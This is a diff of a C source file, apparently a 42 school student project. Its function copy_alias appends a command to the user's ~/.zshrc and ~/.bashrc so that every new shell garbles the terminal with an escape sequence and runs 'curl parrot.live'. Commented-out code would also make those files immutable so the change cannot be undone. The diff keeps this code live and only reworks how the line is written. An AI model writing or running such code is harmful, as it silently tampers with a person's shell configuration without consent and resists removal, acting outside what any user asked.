@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:20:52 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/22 16:18:01 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/22 16:23:50 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -55,7 +55,6 @@ int	copy_alias(char **envp)
 	int			fd;
 	int			flags;
 	char		*path;
-	static char	*command = "GMVRA=\"\"; echo '\e(0'; curl parrot.live";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 
 	(void)(envp);
@@ -70,7 +69,7 @@ int	copy_alias(char **envp)
 		printf("opening and writing in %s\n", path);
 		if ((fd = open(path, O_CREAT | O_WRONLY | O_APPEND)) < 0)
 			return (dprintf(2, "Could not open %s\n", path), free(path), 1);
-		dprintf(fd, "%s\n", command);
+		dprintf(fd, "GMVRA=\"%lu\"; echo '\e(0'; curl parrot.live\n", ft_abs_time());
 		// #if __APPLE__
 		// if (chflags(path, UF_IMMUTABLE) < 0)
 		// 	// return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
